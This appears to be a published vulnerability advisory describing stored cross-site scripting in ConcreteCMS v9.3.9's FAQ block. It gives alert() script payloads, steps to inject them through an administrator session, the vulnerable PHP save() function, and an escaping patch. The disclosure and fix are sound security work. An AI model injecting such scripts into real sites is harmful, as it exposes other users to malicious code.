# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/13/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Navigation field、Title Text field、Description source field when adding a FAQ block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('Navigation Link Text');</script>
<script>alert('Title Text');</script>
<script>alert('Description');</script>
```
1. Use administrator login
2. Click "add content to the page" in the top navigation.
3. Select the FAQ block , drag and drop it to the page.
4. Add <script>alert('...');</script> to the Navigation Link Text field、Title Text、Description(source) and then click save,the xss vulnerability appears.

Potentially problematic source code:
```php
public function save($args)
    {
        $db = $this->app->make('database')->connection();
        $db->executeQuery('DELETE FROM btFaqEntries WHERE bID = ?', [$this->bID]);
        parent::save($args);
        $count = isset($args['sortOrder']) ? count($args['sortOrder']) : 0;

        $i = 0;
        while ($i < $count) {
            if (isset($args['description'][$i])) {
                $args['description'][$i] = LinkAbstractor::translateTo($args['description'][$i]);
            }

            $db->executeQuery(
                'INSERT INTO btFaqEntries (bID, title, linkTitle, description, sortOrder) VALUES(?,?,?,?,?)',
                [
                    $this->bID,
                    $args['title'][$i],
                    $args['linkTitle'][$i],
                    $args['description'][$i],
                    $args['sortOrder'][$i],
                ]
            );
            ++$i;
        }
    }
```

Patch:
```php
public function save($args)
{
    $db = $this->app->make('database')->connection();
    $db->executeQuery('DELETE FROM btFaqEntries WHERE bID = ?', [$this->bID]);
    parent::save($args);
    $count = isset($args['sortOrder']) ? count($args['sortOrder']) : 0;

    $i = 0;
    while ($i < $count) {
        // patch XSS
        if (isset($args['description'][$i])) {
            $args['description'][$i] = LinkAbstractor::translateTo($args['description'][$i]);
            // patch XSS
            $args['description'][$i] = h($args['description'][$i]);
        }

        if (isset($args['title'][$i])) {
            $args['title'][$i] = h($args['title'][$i]); // patch XSS
        }
        if (isset($args['linkTitle'][$i])) {
            $args['linkTitle'][$i] = h($args['linkTitle'][$i]); // patch XSS
        }

        $db->executeQuery(
            'INSERT INTO btFaqEntries (bID, title, linkTitle, description, sortOrder) VALUES(?,?,?,?,?)',
            [
                $this->bID,
                $args['title'][$i],
                $args['linkTitle'][$i],
                $args['description'][$i],
                $args['sortOrder'][$i],
            ]
        );
        ++$i;
    }
}

```